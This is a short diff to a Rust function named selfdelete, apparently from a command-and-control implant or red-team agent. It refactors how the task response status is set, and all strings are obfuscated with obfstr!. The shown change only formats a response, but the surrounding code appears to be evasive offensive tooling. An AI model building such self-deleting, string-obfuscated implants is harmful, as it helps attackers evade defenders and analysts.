@@ -140,6 +140,7 @@ pub fn selfdelete(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
         "Self-delete failed."
     };
 
+    let status = if success { "success" } else { "error" };
     let response_json = serde_json::json!({
         obfstr!("action"): obfstr!("post_response"),
         obfstr!("responses"): [
@@ -147,7 +148,7 @@ pub fn selfdelete(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
                 obfstr!("task_id"): id,
                 obfstr!("user_output"): output,
                 obfstr!("timestamp"): timestamp,
-                obfstr!("status"): if success { obfstr!("success") } else { "error" },
+                obfstr!("status"): status,
                 obfstr!("completed"): true,
             }
         ]
